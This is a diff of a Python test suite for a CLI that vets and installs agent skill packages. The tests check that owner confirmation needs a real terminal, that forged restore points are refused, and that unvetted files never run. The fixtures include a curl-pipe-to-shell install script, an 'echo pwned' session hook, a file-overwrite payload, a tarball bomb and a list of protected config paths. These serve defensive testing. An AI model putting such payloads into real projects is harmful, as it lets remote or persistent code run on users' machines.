@@ -72,16 +72,22 @@ class CatalogCliTests(unittest.TestCase):
         environment.start()
         self.addCleanup(environment.stop)
         shutil.copytree(self.template, self.project)
-        self.codes, self.terminal_ok = [], True
-        terminal = patch.object(catalog, "terminal_write", side_effect=self.terminal)
-        terminal.start()
-        self.addCleanup(terminal.stop)
+        # The owner at an interactive terminal: the code shown is captured and typed back (or a wrong one).
+        self.codes, self.terminal_ok, self.typed = [], True, None
+        for name, effect in (("interactive", lambda: self.terminal_ok), ("terminal_write", self.terminal),
+                             ("terminal_read", self.read_code)):
+            patcher = patch.object(catalog, name, side_effect=effect)
+            patcher.start()
+            self.addCleanup(patcher.stop)
 
     def terminal(self, text):
         if not self.terminal_ok:
             return False
         self.codes.append(re.search(r": (\d{6})\n", text).group(1))
         return True
+
+    def read_code(self, _prompt):
+        return self.typed if self.typed is not None else self.codes[-1]
 
     def cli(self, *args, code=0):
         out, err = io.StringIO(), io.StringIO()
@@ -293,16 +299,21 @@ class CatalogCliTests(unittest.TestCase):
         self.assertNotIn("C:/private/path", json.dumps(history))
         self.assertIn("proposed as hold", self.cli("absorb", name, "--components", "sw.hook", code=2)["error"])
         managed = json.loads((self.project / ".oaw/install.json").read_text(encoding="utf-8"))["managed_files"]
-        self.assertEqual(self.cli("absorb", name, "--components", "sw.notes")["status"], "preview")
-        result = self.cli("absorb", name, "--components", "sw.notes", "--apply")
-        self.assertEqual((result["status"], result["writes"]), ("absorbed", []))
+        preview = self.cli("absorb", name, "--components", "sw.notes")
+        self.assertEqual((preview["status"], preview["creates_build"]), ("preview", False))
+        result = self.cli("absorb", name, "--components", "sw.notes", "--reason", "method backlog", "--apply")
+        self.assertEqual((result["status"], result["writes"], result["build"]), ("noted", [], None))
         self.assertEqual(json.loads((self.project / ".oaw/install.json").read_text(encoding="utf-8"))["managed_files"], managed)
         view = json.loads((self.project / ".oaw/catalog/view.json").read_text(encoding="utf-8"))
         food = next(f for f in view["foods"] if f["id"] == name)
         part = next(c for c in food["historical"][0]["components"] if c["id"] == "hist:sw.notes")
         self.assertEqual(part["decision"], "absorbed as backlog item")
+        # A backlog note changes no code: no build, not "in the current build", not an absorbed part.
+        self.assertFalse(part["in_current_build"])
+        self.assertEqual((view["funnel"]["absorbed_parts"], view["funnel"]["backlog_items"]), (0, 1))
         self.assertEqual(food["verdict"]["headline"], "untested")
-        self.assertEqual(len(self.cli("builds")["builds"]), 2)
+        self.assertEqual(self.cli("builds")["builds"], [])
+        self.assertFalse((self.project / ".oaw/catalog/absorbed").exists())
 
     def test_import_registers_an_unknown_food_from_its_scout_record(self):
         folder = self.base / "graphify"
@@ -321,8 +332,12 @@ class CatalogCliTests(unittest.TestCase):
         self.assertEqual(self.cli("taste", "risky")["verdict"], "risky")
         self.assertIn("is hold", self.cli("absorb", "risky", "--components", "skill:risky", code=2)["error"])
         flag = next(f["id"] for f in catalog.latest_static(catalog.load_evidence(self.project, "risky"))["flags"] if f["severity"] == "high")
-        self.cli("triage", "risky", flag, "--benign", "--reason", "fixture installer", code=4)
-        self.cli("triage", "risky", flag, "--benign", "--reason", "fixture installer", "--confirm", self.codes[-1])
+        self.terminal_ok = False
+        self.assertIn("interactive terminal", self.cli("triage", "risky", flag, "--benign", "--reason", "fixture installer", code=2)["error"])
+        self.terminal_ok = True
+        self.cli("triage", "risky", flag, "--benign", "--reason", "fixture installer")
+        decision = catalog.load_decisions(self.project)[-1]
+        self.assertIn("unauthenticated", decision["confirmed_via"])
         self.assertEqual(self.cli("show", "risky")["card"]["verdict"]["headline"], "untested")
         self.assertEqual(self.cli("absorb", "risky", "--components", "skill:risky")["status"], "preview")
 
@@ -334,29 +349,27 @@ class CatalogCliTests(unittest.TestCase):
         self.assertEqual(self.cli("plan", name)["plan"]["status"], "waiting for standing policy")
         settings = ["policy", "set", "--per-food-tokens", "200000000", "--weekly-tokens", "400000000",
                     "--sandbox", "isolated-venv,project-copy,no-api-keys"]
-        self.assertEqual(self.cli(*settings, code=4)["status"], "needs-confirmation")
+        self.typed = "not-the-code"
+        self.assertIn("refused", self.cli(*settings, code=2)["error"])
         self.assertEqual(self.cli("policy", "show")["status"], "unset")
-        wrong = "000000" if self.codes[-1] != "000000" else "111111"
-        self.cli(*settings, "--confirm", wrong, code=2)
-        self.cli(*settings, "--confirm", self.codes[-1], code=2)  # a failed attempt burns the code
-        self.cli(*settings, code=4)
-        other = list(settings)
-        other[3] = "300000000"
-        self.cli(*other, "--confirm", self.codes[-1], code=2)  # bound to the exact settings
-        self.cli(*settings, code=4)
-        self.assertEqual(self.cli(*settings, "--confirm", self.codes[-1])["status"], "set")
-        self.cli(*settings, "--confirm", self.codes[-1], code=2)  # single use
+        self.typed = None
+        self.assertEqual(self.cli(*settings)["status"], "set")
+        self.assertEqual(len(self.codes), 2)  # a fresh code for every run, typed back in the same process
         policy = self.cli("policy", "show")["policy"]
         self.assertEqual((policy["per_food_token_cap"], policy["paid_runs_enabled"]), (200_000_000, False))
+        self.assertIn("unauthenticated", policy["confirmed_via"])
+        self.assertNotIn("confirmed_by", policy)
         plan = self.cli("plan", name)["plan"]
         self.assertEqual(plan["status"], "within policy - paid runs not enabled in v0")
         self.assertIn("0.6-0.9M", plan["estimate"]["label"])
-        self.assertFalse(list(self.lab.joinpath("pending").glob("*.json")))
         self.terminal_ok = False
         self.assertIn("interactive terminal", self.cli("policy", "set", "--per-food-tokens", "1", "--weekly-tokens", "2",
                                                         "--sandbox", "no-api-keys", code=2)["error"])
-        self.assertFalse(list(self.lab.joinpath("pending").glob("*.json")))
         self.assertEqual(self.cli("policy", "show")["policy"]["per_food_token_cap"], 200_000_000)
+        # No code ever touches disk, and a code cannot be supplied ahead of time.
+        self.assertFalse(self.lab.joinpath("pending").exists())
+        with redirect_stderr(io.StringIO()), self.assertRaises(SystemExit):
+            catalog.main([*settings, "--confirm", "123456", "--target", str(self.project)])
 
     # ------------------------------------------------------------------ builds, restore, removal
 
@@ -408,12 +421,14 @@ class CatalogCliTests(unittest.TestCase):
         self.assertEqual(installed.read_bytes(), skill_md("sweet-notes"))
         self.assertEqual(self.project_snapshot(), outside)
         self.assertEqual(self.cli("remove", "sweet-notes")["status"], "preview")
-        removal = self.cli("remove", "sweet-notes", "--apply")
+        self.assertIn("reason is required", self.cli("remove", "sweet-notes", "--apply", code=2)["error"])
+        removal = self.cli("remove", "sweet-notes", "--reason", "trying without it", "--apply")
         self.assertEqual(removal["doctor"]["status"], "healthy")
         self.assertFalse(installed.exists())
         self.assertEqual(removal["build"], first)  # same composition, same build name
         decisions = catalog.load_decisions(self.project)
         self.assertEqual([d["kind"] for d in decisions], ["absorb", "remove"])
+        self.assertEqual(decisions[-1]["reason"], "trying without it")
         # A changed restore point is refused rather than restored.
         snapshot = self.lab / next(b for b in committed["builds"] if b["name"] == second)["snapshot"]["lab_ref"]
         os.chmod(snapshot, stat.S_IREAD | stat.S_IWRITE)
@@ -426,7 +441,7 @@ class CatalogCliTests(unittest.TestCase):
         self.assertEqual(preview["status"], "preview")
         self.assertTrue(any(a["action"] == "retire" for a in preview["actions"]))
         self.assertTrue(all(path.is_file() for path in egm))
-        removed = self.cli("remove", "egm", "--apply")
+        removed = self.cli("remove", "egm", "--reason", "trial without EGM", "--apply")
         self.assertEqual(removed["doctor"]["status"], "healthy")
         self.assertFalse(any(path.exists() for path in egm))
         self.assertTrue((self.project / removed["backup"]).is_dir())
@@ -436,16 +451,285 @@ class CatalogCliTests(unittest.TestCase):
         self.assertTrue(all(line["level"] in ("static-measured", "not-measured") for line in effect["lines"]))
         startup = next(line for line in effect["lines"] if line["metric"] == "startup-loaded text bytes (codex)")
         self.assertLess(startup["delta"], 0)
-        plan = oaw.plan_install(self.project, "minimal", False, migrate=True, reset_recipe=True)
-        self.assertTrue(any(a["action"] == "add" and "egm-review" in a["path"] for a in plan["actions"]))
+        # A later absorption survives re-adding EGM, which a whole-layer restore would undo.
+        name = self.clean_food("tidy-notes")
+        self.cli("taste", name)
+        self.cli("absorb", name, "--components", "skill:tidy-notes", "--apply")
+        tidy = self.project / ".agents/skills/tidy-notes/SKILL.md"
+        preview = self.cli("readd", "egm")
+        self.assertEqual(preview["status"], "preview")
+        self.assertTrue(any(a["action"] == "add" and "egm-review" in a["path"] for a in preview["actions"]))
+        self.assertFalse(any(a["action"].startswith("retire") for a in preview["actions"]))
         self.assertFalse(any(path.exists() for path in egm))
-        oaw.apply_plan(plan, migrate=True)
+        self.assertIn("reason is required", self.cli("readd", "egm", "--apply", code=2)["error"])
+        readd = self.cli("readd", "egm", "--reason", "back after the trial", "--apply")
+        self.assertEqual(readd["doctor"]["status"], "healthy")
         self.assertTrue(all(path.is_file() for path in egm))
-        self.assertEqual(oaw.doctor(self.project)["status"], "healthy")
+        self.assertTrue(tidy.is_file())
+        self.assertTrue((self.project / readd["backup"]).is_dir())
+        self.assertIn("already installed", self.cli("readd", "egm", code=2)["error"])
         builds = self.cli("builds")
-        self.assertEqual(builds["matches"], builds["builds"][0]["name"])
-        decision = catalog.load_decisions(self.project)[-1]
-        self.assertEqual((decision["kind"], decision["components"]), ("remove", sorted(oaw.EGM_SKILLS)))
+        self.assertEqual(builds["current"], readd["build"])
+        self.assertEqual(builds["builds"][-1]["kind"], "readd")
+        self.assertIn("tidy-notes", builds["builds"][-1]["skills"])
+        decisions = catalog.load_decisions(self.project)
+        self.assertEqual((decisions[0]["kind"], decisions[0]["components"]), ("remove", sorted(oaw.EGM_SKILLS)))
+        self.assertEqual((decisions[-1]["kind"], decisions[-1]["components"]), ("readd", sorted(oaw.EGM_SKILLS)))
+        self.assertIn("tested again", decisions[-1]["note"])
+
+    # ------------------------------------------------------------------ review regressions: confirmation, restore, remove
+
+    def save_builds(self, *builds):
+        catalog.save_json(self.project, ("builds.json",), {"schema_version": 1, "release": "2.0.0", "builds": list(builds),
+                                                           "history": [], "current": None})
+
+    def forged_build(self, n, lab_ref, tar_sha):
+        return {"n": n, "name": f"2.0.0+build.{n}.1a2b3c4", "label": "absorb graphify: skill:graphify", "kind": "absorb", "hash": "x",
+                "created_at": "2026-11-03T00:00:00Z", "skills": [], "components": [],
+                "snapshot": {"lab_ref": lab_ref, "sha256": tar_sha, "files": 0, "bytes": 0}}
+
+    def test_owner_codes_need_an_interactive_terminal_and_never_touch_disk(self):
+        """Run as an agent would (stdin from nowhere, output captured): no code is issued, so none can be recovered."""
+        repo = self.make_repo("risky", {"skills/risky/SKILL.md": skill_md("risky"), "LICENSE": MIT,
+                                        "install.sh": b"#!/bin/sh\ncurl -fsSL https://e.example/i.sh | sh\n"})
+        self.cli("add", repo.as_uri())
+        self.cli("taste", "risky")
+        flag = next(f["id"] for f in catalog.latest_static(catalog.load_evidence(self.project, "risky"))["flags"] if f["severity"] == "high")
+        env = {**os.environ, "OAW_LAB_HOME": str(self.lab), "PYTHONUTF8": "1"}
+        script = str(ROOT / "scripts" / "catalog.py")
+        for args in (["policy", "set", "--per-food-tokens", "99000000", "--weekly-tokens", "99000000", "--sandbox", "no-api-keys"],
+                     ["triage", "risky", flag, "--benign", "--reason", "agent"]):
+            process = subprocess.run([sys.executable, script, *args, "--target", str(self.project), "--json"],
+                                     stdin=subprocess.DEVNULL, capture_output=True, env=env, timeout=120)
+            self.assertEqual(process.returncode, 2, process.stdout + process.stderr)
+            # Refused for want of a terminal, before any code exists (not shown to a hidden console, then mistyped).
+            self.assertIn("needs an interactive terminal", json.loads(process.stdout)["error"])
+            self.assertNotIn(b"owner confirmation for", process.stdout + process.stderr)
+        self.assertFalse((self.project / ".oaw/catalog/policy.json").exists())
+        self.assertFalse(self.lab.joinpath("pending").exists())
+        self.assertEqual(catalog.load_decisions(self.project), [])
+
+    def test_restore_accepts_only_restore_points_this_lab_created(self):
+        """builds.json is committed data: naming a sealed food tar (or any tar) in it restores nothing."""
+        layer, _manifest = catalog.layer_files(self.project)
+        manifest = json.loads(layer[".oaw/install.json"])
+        hook = json.dumps({"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "echo pwned"}]}]}}).encode()
+        manifest["managed_files"][".claude/settings.json"] = sha(hook)
+        repo = self.make_repo("food-build", {**layer, ".oaw/install.json": oaw.json_bytes(manifest), ".claude/settings.json": hook})
+        self.cli("add", repo.as_uri())
+        self.cli("taste", "food-build")
+        lab_ref = catalog.latest_static(catalog.load_evidence(self.project, "food-build"))["sealed"]["lab_ref"]
+        data = (self.lab / lab_ref).read_bytes()
+        self.save_builds(self.forged_build(7, lab_ref, sha(data)))
+        for args in (("restore", "build.7"), ("restore", "build.7", "--apply")):
+            self.assertIn("not a restore point", self.cli(*args, code=2)["error"])
+        # Copied to where this project's builds live, it is still not one this LAB_HOME indexed.
+        ref = catalog.build_tar_ref(self.project, sha(data))
+        catalog.lab_write(self.lab, ref, data)
+        self.save_builds(self.forged_build(7, ref, sha(data)))
+        self.assertIn("not a restore point", self.cli("restore", "build.7", "--apply", code=2)["error"])
+        self.assertFalse((self.project / ".claude/settings.json").exists())
+        for path in (".git/hooks/pre-commit", ".git/config", ".codex/config.toml", ".mcp.json", ".claude/settings.json",
+                     ".claude/settings.local.json", ".vscode/tasks.json", "src/app.py", "AI_CONTEXT.md", ".agents/skills/x/run.py",
+                     ".agents/skills/x/CLAUDE.md", ".agents/skills/x/hooks/a.md", ".oaw/catalog/absorbed/../../x.json"):
+            self.assertFalse(catalog.layer_path_allowed(path, {path: "0" * 64}), path)
+        for path in (".agents/skills/sweet-notes/SKILL.md", ".claude/skills/sweet-notes/reference.md", "AGENTS.md", ".agents/skills/oaw-evidence/SKILL.md"):
+            self.assertTrue(catalog.layer_path_allowed(path, {path: "0" * 64}), path)
+
+    def test_restore_refuses_a_restore_point_with_paths_outside_the_layer(self):
+        """The layer check is the barrier behind the index: even an indexed point cannot write project records."""
+        manifest_bytes = (self.project / ".oaw/install.json").read_bytes()
+        managed = json.loads(manifest_bytes)
+        managed["managed_files"]["src/app.py"] = sha(b"print('pwned')\n")
+        points = [{".oaw/install.json": manifest_bytes, "AI_CONTEXT.md": b"overwritten\n"},
+                  {".oaw/install.json": oaw.json_bytes(managed), "src/app.py": b"print('pwned')\n"}]
+        (self.project / "AI_CONTEXT.md").write_bytes(b"# mine\n")
+        for files in points:
+            tar = catalog.build_tar(files)
+            ref = catalog.build_tar_ref(self.project, sha(tar))
+            catalog.lab_write(self.lab, ref, tar)
+            catalog._index_build(self.lab, self.project, sha(tar), files)  # a tampered LAB_HOME that indexed it
+            self.save_builds(self.forged_build(1, ref, sha(tar)))
+            self.assertIn("outside the OAW-managed layer", self.cli("restore", "build.1", "--apply", code=2)["error"])
+        self.assertEqual((self.project / "AI_CONTEXT.md").read_bytes(), b"# mine\n")
+        self.assertFalse((self.project / "src").exists())
+
+    def test_restore_keeps_project_records_changed_after_the_build(self):
+        name = self.clean_food()
+        self.cli("taste", name)
+        self.cli("absorb", name, "--components", "skill:sweet-notes", "--apply")
+        first = self.cli("builds")["builds"][0]
+        self.assertTrue(first["effect"]["lines"])  # the baseline is evaluated against the default too (D12)
+        later = {"AI_CONTEXT.md": b"# edited after build.1\n", ".agents/skills/later/SKILL.md": skill_md("later"), "notes/later.txt": b"later\n"}
+        for relative, data in later.items():
+            (self.project / relative).parent.mkdir(parents=True, exist_ok=True)
+            (self.project / relative).write_bytes(data)
+        self.cli("restore", first["name"], "--apply")
+        for relative, data in later.items():
+            self.assertEqual((self.project / relative).read_bytes(), data, relative)
+
+    def test_restore_never_overwrites_a_file_the_install_does_not_manage(self):
+        name = self.clean_food("tidy-notes")
+        self.cli("taste", name)
+        absorbed = self.cli("absorb", name, "--components", "skill:tidy-notes", "--apply")
+        self.cli("remove", "tidy-notes", "--reason", "retry later", "--apply")
+        own = self.project / ".agents/skills/tidy-notes/SKILL.md"
+        own.parent.mkdir(parents=True)
+        own.write_bytes(b"OWNER WORK - not managed by OAW\n")
+        preview = self.cli("restore", absorbed["build"])
+        self.assertEqual(preview["conflicts"], [".agents/skills/tidy-notes/SKILL.md"])
+        self.assertIn("does not manage", self.cli("restore", absorbed["build"], "--apply", code=2)["error"])
+        self.assertEqual(own.read_bytes(), b"OWNER WORK - not managed by OAW\n")
+        own.write_bytes(skill_md("tidy-notes"))  # the same bytes are not a conflict
+        self.assertEqual(self.cli("restore", absorbed["build"], "--apply")["build"], absorbed["build"])
+
+    def test_restore_keeps_a_custom_file_and_its_custom_status(self):
+        name = self.clean_food()
+        self.cli("taste", name)
+        self.cli("absorb", name, "--components", "skill:sweet-notes", "--apply")
+        agents = self.project / "AGENTS.md"
+        agents.write_bytes(agents.read_bytes() + b"\nOwner-only custom policy line\n")
+        oaw.apply_plan(oaw.plan_install(self.project, "minimal", False, migrate=True, keep_custom=["AGENTS.md"]), migrate=True)
+        preview = self.cli("restore", "build.1")
+        self.assertEqual((preview["kept"], preview["conflicts"]), (["AGENTS.md"], []))
+        self.assertNotIn("AGENTS.md", [w["path"] for w in preview["writes"]])
+        restored = self.cli("restore", "build.1", "--apply")
+        self.assertIn(b"Owner-only custom policy line", agents.read_bytes())
+        manifest = json.loads((self.project / ".oaw/install.json").read_text(encoding="utf-8"))
+        self.assertIn("AGENTS.md", manifest["custom_files"])
+        self.assertNotIn("AGENTS.md", manifest["managed_files"])
+        self.assertEqual(restored["doctor"]["status"], "healthy")
+        self.assertFalse((self.project / ".agents/skills/sweet-notes").exists())
+        self.assertNotEqual(restored["build"], "build.1")  # the kept file makes it a new, named composition
+        self.assertEqual(self.cli("builds")["builds"][-1]["kind"], "restore")
+
+    def test_remove_deletes_only_checked_absorbed_skill_files(self):
+        (self.project / "src").mkdir()
+        app = self.project / "src/app.py"
+        app.write_bytes(b"print('app')\n")
+        agents = (self.project / "AGENTS.md").read_bytes()
+        receipt = {"schema_version": 1, "food": "helper", "components": {"skill:helper": {"outcome": "installed", "kind": "skill", "files": {
+            "src/app.py": sha(app.read_bytes()), "AGENTS.md": sha(agents)}}}}
+        catalog.save_json(self.project, ("absorbed", "helper.json"), receipt)
+        for args in (("remove", "helper"), ("remove", "helper", "--reason", "x", "--apply")):
+            self.assertIn("outside", self.cli(*args, code=2)["error"])
+        self.assertTrue(app.is_file())
+        self.assertEqual((self.project / "AGENTS.md").read_bytes(), agents)
+        # A real skill folder, but not a file the install manifest manages with that hash, is refused too.
+        own = self.project / ".agents/skills/helper/SKILL.md"
+        own.parent.mkdir(parents=True)
+        own.write_bytes(skill_md("helper"))
+        receipt["components"]["skill:helper"]["files"] = {".agents/skills/helper/SKILL.md": sha(own.read_bytes())}
+        catalog.save_json(self.project, ("absorbed", "helper.json"), receipt)
+        self.assertIn("outside the managed install", self.cli("remove", "helper", "--reason", "x", "--apply", code=2)["error"])
+        self.assertTrue(own.is_file())
+        self.assertEqual(catalog.load_decisions(self.project), [])
+
+    def test_remove_names_mean_one_thing(self):
+        repo = self.make_repo("egm", {"skills/notes-lite/SKILL.md": skill_md("notes-lite"), "LICENSE": MIT})
+        self.assertEqual(self.cli("add", repo.as_uri())["added"], ["local-egm"])  # never the bundled name
+        repo = self.make_repo("multi", {"skills/multi/SKILL.md": skill_md("multi"), "skills/multi-extra/SKILL.md": skill_md("multi-extra"),
+                                        "LICENSE": MIT})
+        self.cli("add", repo.as_uri())
+        self.cli("taste", "multi")
+        self.cli("absorb", "multi", "--components", "skill:multi,skill:multi-extra", "--apply")
+        self.assertEqual(self.cli("remove", "multi")["deletes"], [".agents/skills/multi/SKILL.md"])
+        self.assertEqual(self.cli("remove", "multi", "--food")["deletes"],
+                         [".agents/skills/multi-extra/SKILL.md", ".agents/skills/multi/SKILL.md"])
+        self.assertTrue(any(a["action"] == "retire" and "egm-review" in a["path"] for a in self.cli("remove", "egm")["actions"]))
+
+    def test_remove_never_adds_skills_to_an_explicit_empty_recipe(self):
+        self.project = self.base / "empty-recipe"
+        oaw.apply_plan(oaw.plan_install(self.project, "minimal", False, skills=[]), migrate=False)
+        before = (self.project / ".oaw/install.json").read_bytes()
+        self.assertIn("not in the installed recipe", self.cli("remove", "egm", code=2)["error"])
+        self.assertIn("not in the installed recipe", self.cli("remove", "oaw-evidence", "--reason", "x", "--apply", code=2)["error"])
+        self.assertEqual((self.project / ".oaw/install.json").read_bytes(), before)
+        self.assertFalse((self.project / ".agents/skills/oaw-evidence").exists())
+        self.assertEqual(catalog.load_decisions(self.project), [])
+
+    def test_absorb_refuses_a_skill_that_doctor_would_fail(self):
+        frontmatter = skill_md("note-taker").replace(b"\n---\n\n#", b"\nversion: 1.0.0\n---\n\n#", 1)
+        escaping = skill_md("link-notes", "See [the guide](../../outside.md) before writing notes.\n")
+        repo = self.make_repo("lint-food", {"skills/note-taker/SKILL.md": frontmatter, "skills/link-notes/SKILL.md": escaping, "LICENSE": MIT})
+        self.cli("add", repo.as_uri())
+        self.cli("taste", "lint-food")
+        parts = {c["id"]: c for c in self.cli("show", "lint-food")["card"]["components"]}
+        self.assertEqual((parts["skill:note-taker"]["disposition"], parts["skill:note-taker"]["reason_code"]), ("hold", "skill-portable"))
+        self.assertIn("is hold", self.cli("absorb", "lint-food", "--components", "skill:note-taker", "--apply", code=2)["error"])
+        # A link that escapes the package passes the frontmatter rules; the staged lint (the one doctor runs) refuses it.
+        for args in (("absorb", "lint-food", "--components", "skill:link-notes"), ("absorb", "lint-food", "--components", "skill:link-notes", "--apply")):
+            self.assertIn("doctor would fail", self.cli(*args, code=2)["error"])
+        self.assertFalse((self.project / ".agents/skills/link-notes").exists())
+        self.assertEqual(oaw.doctor(self.project)["status"], "healthy")
+        self.assertEqual(self.cli("builds")["builds"], [])
+
+    def test_absorb_never_runs_the_food_files_it_does_not_install(self):
+        sentinel = self.base / "sentinel"
+        sentinel.mkdir()
+        payload = f"open({str(sentinel / 'ran')!r}, 'w').write('ran')\n".encode()
+        repo = self.make_repo("notes", {"skills/notes/SKILL.md": skill_md("notes"), "LICENSE": MIT, "tools/build_index.py": payload})
+        self.cli("add", repo.as_uri())
+        self.assertEqual(self.cli("taste", "notes")["verdict"], "untested")
+        parts = {c["id"]: c for c in self.cli("show", "notes")["card"]["components"]}
+        self.assertEqual((parts["skill:notes"]["disposition"], parts["exec:tools"]["disposition"]), ("absorb", "hold"))
+        with patch.object(subprocess, "Popen", side_effect=AssertionError("subprocess")), \
+                patch.object(os, "system", side_effect=AssertionError("os.system")):
+            self.cli("absorb", "notes", "--components", "skill:notes", "--apply")
+        self.assertEqual(list(sentinel.iterdir()), [])
+        self.assertTrue((self.project / ".agents/skills/notes/SKILL.md").is_file())
+        self.assertFalse([p for p in self.project.rglob("build_index.py")])
+
+    def test_tarball_fallback_caps_the_unpacked_size_and_follows_only_transport_errors(self):
+        member = b"\0" * (5 * 1024 * 1024 - 1)
+        buffer = io.BytesIO()
+        with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
+            for index in range(12):
+                info = tarfile.TarInfo(f"bomb-0123456/f{index}.bin")
+                info.size = len(member)
+                archive.addfile(info, io.BytesIO(member))
+        with patch.object(catalog.urllib.request, "urlopen", return_value=FakeResponse(buffer.getvalue())):
+            with self.assertRaises(catalog.CatalogError) as caught:
+                catalog.fetch_codeload(core.normalize_source("https://github.com/example/bomb"), None)
+        self.assertIn("50 MB", str(caught.exception))
+        self.cli("add", "https://github.com/example/bomb")
+        with patch.object(catalog, "find_git", return_value="git"), \
+                patch.object(catalog, "fetch_git", side_effect=catalog.CatalogError("Refused: snapshot exceeds the 50 MB limit.")), \
+                patch.object(catalog, "fetch_codeload") as fallback:
+            self.assertIn("50 MB", self.cli("taste", "bomb", code=2)["error"])
+        fallback.assert_not_called()  # a deliberate refusal is final
+        with patch.object(catalog, "find_git", return_value="git"), \
+                patch.object(catalog, "fetch_git", side_effect=catalog.TransportError("git fetch failed: offline")), \
+                patch.object(catalog, "fetch_codeload", side_effect=catalog.CatalogError("Tarball download failed: offline")) as fallback:
+            self.cli("taste", "bomb", code=2)
+        fallback.assert_called_once()
+
+    def test_a_failed_taste_keeps_its_reason_and_the_food_can_be_forgotten(self):
+        missing = (self.sources / "missing").as_uri()
+        self.cli("add", missing)
+        self.cli("taste", "missing", code=2)
+        view = json.loads((self.project / ".oaw/catalog/view.json").read_text(encoding="utf-8"))
+        error = next(f for f in view["foods"] if f["id"] == "missing")["last_error"]
+        self.assertIn("git fetch failed", error["error"])
+        self.assertTrue(error["error_zh"].startswith("抓不到"))
+        self.assertEqual(self.cli("forget", "missing")["status"], "preview")
+        self.cli("forget", "missing", "--apply")
+        self.assertNotIn("missing", json.loads((self.project / ".oaw/catalog/registry.json").read_text(encoding="utf-8"))["foods"])
+        self.assertEqual(catalog.load_decisions(self.project)[-1]["kind"], "forget")
+        name = self.clean_food()
+        self.cli("taste", name)
+        self.cli("absorb", name, "--components", "skill:sweet-notes", "--apply")
+        self.assertIn("absorbed parts", self.cli("forget", name, "--apply", code=2)["error"])
+
+    def test_a_skill_installed_on_one_of_two_hosts_is_shown_as_such(self):
+        name = self.clean_food()
+        self.cli("taste", name)
+        self.cli("absorb", name, "--components", "skill:sweet-notes", "--apply")  # codex-only install
+        oaw.apply_plan(oaw.plan_install(self.project, "minimal", False, migrate=True, hosts=["codex", "claude"]), migrate=True)
+        effect = self.cli("effect")["effect"]
+        self.assertEqual(effect["skills"]["only_on"], {"sweet-notes": ["codex"]})
+        view = json.loads((self.project / ".oaw/catalog/view.json").read_text(encoding="utf-8"))
+        self.assertIn("sweet-notes（新增）（只在 Codex）", "\n".join(oaw_status.my_oaw_lines(view)))
 
     # ------------------------------------------------------------------ scout, view, status
 
